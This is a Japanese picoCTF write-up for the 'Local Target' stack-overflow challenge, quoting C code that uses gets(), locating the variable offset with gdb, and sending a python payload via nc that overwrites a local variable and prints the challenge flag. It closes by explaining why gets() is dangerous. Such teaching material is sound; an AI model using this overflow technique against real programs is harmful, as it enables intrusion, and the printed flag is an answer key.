# picoCTF Writeup: Local Target

スタックオーバーフローをやってみよう問題

- ジャンル: Binary Exploitation
- 難易度: Medium

## Writeup
問題文
>Smash the stack
Can you overflow the buffer and modify the other local variable? The program is available here. You can view source here. And connect with it using:
nc saturn.picoctf.net 56225
スタックをしばく。
バッファをオーバーフローさせて他のローカル変数を変更できますか？プログラムはこちらから入手できます。ソースはこちらからご覧いただけます 。そして、以下のコマンドで接続できます。
nc saturn.picoctf.net 56225

では、まずはソースを読んでみましょう。
```
int main(){
  FILE *fptr;
  char c;

  char input[16];
  int num = 64;
  
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");
  
  printf("num is %d\n", num);
  fflush(stdout);
  
  if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }

    // Read contents from file
    c = fgetc(fptr);
    while (c != EOF)
    {
        printf ("%c", c);
        c = fgetc(fptr);
    }
    fflush(stdout);

    printf("\n");
    fflush(stdout);
    fclose(fptr);
    exit(0);
  }
  
  printf("Bye!\n");
  fflush(stdout);
}
```
結構短めのソースですね。

`num`が`65`であればflagがみれるようです。
`num`の初期値は`64`になっています。
ユーザーが入力した文字列が`input`に格納されます。

スタックオーバーフローの問題なので、
ユーザーの入力を大きくすることで`input`のメモリ領域をはみ出させて、
`num`の値を65に上書きすればflagをとれそうです。

それぞれの変数`input`と`num`のメモリ番地を確認できれば、どれくらい`input`をあふれさせればよいかわかります。

今回は`gdb`で`input`と`num`のメモリ番地を確認していきます。
バイナリファイルをダウンロードして、実行権限を付与してください。
そして、`gdb`を起動します。
```
gdb ./local-target
```
`main`にブレークポイントを置きます。
```
(gdb) break main
Breakpoint 1 at 0x40123e
```
実行します。
```
(gdb) run
Starting program: /tmp/localt/local-target 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x000000000040123e in main ()
```
`main`に止まったら、逆アセンブルします。
```
(gdb) disassemble main
Dump of assembler code for function main:
   0x0000000000401236 <+0>:     endbr64
   0x000000000040123a <+4>:     push   %rbp
   0x000000000040123b <+5>:     mov    %rsp,%rbp
=> 0x000000000040123e <+8>:     sub    $0x20,%rsp
   0x0000000000401242 <+12>:    movl   $0x40,-0x8(%rbp)
   0x0000000000401249 <+19>:    lea    0xdb4(%rip),%rdi        # 0x402004
   0x0000000000401250 <+26>:    mov    $0x0,%eax
   0x0000000000401255 <+31>:    call   0x4010f0 <printf@plt>
   0x000000000040125a <+36>:    mov    0x2e0f(%rip),%rax        # 0x404070 <stdout@@GLIBC_2.2.5>                                                                                
   0x0000000000401261 <+43>:    mov    %rax,%rdi
   0x0000000000401264 <+46>:    call   0x401120 <fflush@plt>
   0x0000000000401269 <+51>:    lea    -0x20(%rbp),%rax

```
こんな内容が見えます。

この中で、`num`と`input`にあたる行は以下になります。
```
num ->      movl $0x40,-0x8(%rbp)
input ->    lea    -0x20(%rbp),%rax
```
`num`は `rbp - 8`の位置に`0x40`(10進数の`64`)を書き込み、
`input`は `rbp - 20`の位置に定義という意味です。
※`rbp`は「この関数のスタックの基準位置」という理解でいいと思います。

位置関係を図で示すと
```
rbp-0x20    input先頭
rbp-0x08    num先頭
```
となり、差は`0x18`の`24`bytesとなります。

つまり、`input`に24文字以上入力すると`num`のメモリ領域に到達することになります。

`num`は`int`なので`4`bytesで、リトルエンディアンで`65`にするには、
`0x41 0x00 0x00 0x00`になります。

これをサーバーにpythonでrawバイトとして送り付けましょう。

```
$ python3 -c 'print("A"*24 + "\x41\x00\x00\x00")' | nc saturn.picoctf.net 55369
Enter a string: 
num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_fee8ef05}
```
flagがとれました。

## 余談
`gets()`は入力サイズを一切チェックしないため、バッファオーバーフローの典型的な原因になります。
その結果、非常に危険な関数として扱われ、C11以降の標準規格では**削除**されました。

最近の`Linux + GCC`環境では、`gets()`を使ったコードは警告またはエラーとなり、コンパイルが通らない場合があります。
現在は代わりに`fgets()`の利用が推奨されています。